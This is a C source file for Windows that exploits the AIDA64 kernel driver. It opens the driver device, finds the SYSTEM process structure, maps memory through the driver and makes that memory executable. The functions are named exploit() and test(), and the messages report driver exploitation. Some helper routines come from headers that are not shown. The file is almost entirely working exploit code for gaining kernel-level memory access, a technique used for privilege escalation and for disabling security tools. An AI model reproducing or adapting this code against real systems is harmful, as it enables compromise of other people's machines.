#include "windows.h"
#include "memory.h"

#ifndef HELPER_CLASS
#include "helpers.h"
#endif // !HELPER_CLASS


int test() {
    HANDLE hDriver = CreateFile(L"\\\\.\\AIDA64DRIVER", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hDriver == INVALID_HANDLE_VALUE)
    {
        printf("[!] Error while creating a handle to the driver: %d\n", GetLastError());
        exit(1);
    }

    printf("[>] Exploiting driver for read..\n");
    printf("[>] Getting system EPROCESS.. ");
    ULONG64 systemProc = findSystemEPROCESS();
    printf("0x%llx\n", systemProc);
    getchar();

    printf("[>] Mapping sample memory.. \n");
    ULONG64 mapped = driverMmMap(hDriver, 0x0, 0x1000);
    printf("[+] Mapped: 0x%016llx\n", mapped);
    DWORD localBytesReturned = 0;
    BOOL success = VirtualProtect((LPVOID)mapped, 0x1000, PAGE_EXECUTE_READWRITE, &localBytesReturned);
    if (success == FALSE) {
		printf("[-] Failed to change memory protection: %08x\n", GetLastError());
		getchar();
		exit(1);
	}
    printf("[+] Memory protection changed\n");
    getchar();
    return 0;
}


int exploit() {
    HANDLE hDriver = CreateFile(L"\\\\.\\AIDA64DRIVER", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hDriver == INVALID_HANDLE_VALUE)
    {
        printf("[!] Error while creating a handle to the driver: %d\n", GetLastError());
        exit(1);
    }

    printf("[>] Exploiting driver..\n");

    // Return a pointer to our output buffer
    if (!map_memory(hDriver, (DriverMmMapper)driverMmMap)) {
        printf("[+] Exploited driver\n");
        return 0;
    }
    else {
		printf("[-] Failed to exploit driver\n");
		getchar();
        return 1;
	}

    return 0;
}

int main() {
    int res = exploit();
    getchar();

    return res;
}